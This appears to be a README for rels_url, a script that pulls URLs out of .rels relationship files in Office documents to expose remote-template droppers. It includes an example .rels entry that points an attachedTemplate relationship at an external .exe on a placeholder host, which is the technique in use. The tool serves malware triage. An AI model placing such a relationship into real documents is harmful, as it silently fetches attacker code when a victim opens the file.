# rels_url
Office 2007+ Relational links URL extractor  

rels_url is a script that parses post 2007 or newer Micsocoft Office documents (e.g. docx, xlsx, pptx), to reveal URLs located in .rels files.  

## What is a RELS file? 
Files that contain the .rels file extension are relationship files. These files contain information about how the parts of different Microsoft Office documents fit together. This information is also referred to as relationship parts.

RELS files serve as markers for the documents that they pertain to. They allow the various Microsoft Office applications to utilize the information in one file so that it can be used in another file.

The RELS file format is only compatible with the more recent versions of the Microsoft Office applications which support Open Office XML documents. The RELS files are saved in the directory of the Open Office XML document.

## How threat actors use the RELS files for malicious purposes  
Threat actors can use the RELS file to access URLs and download a dropper file. This tactic is very sneaky since the .rels files are read when a document is opened and before the user can interact with the document. The user is not prompted to allow the URL to be accessed.  

## Example of a .rels file  
\<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\<Relationship  Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"  Target="https://sample.com/sample1/sample2/file.exe" TargetMode="External"/>\</Relationships>

## To Use:  
rels_url.py  file.docx

*The output will list the folder and file the URL is located in:*  

## Sample Output  
 C:\Users\cyb3rw01f>rels_url.py D:\rels_docx

_rels/.rels

word/_rels/document.xml.rels

word/_rels/settings.xml.rels  
"https://sample.com/sample1/sample2/file.exe"

customXml/_rels/item1.xml.rels

customXml/_rels/item2.xml.rels

customXml/_rels/item3.xml.rels

customXml/_rels/item4.xml.rels
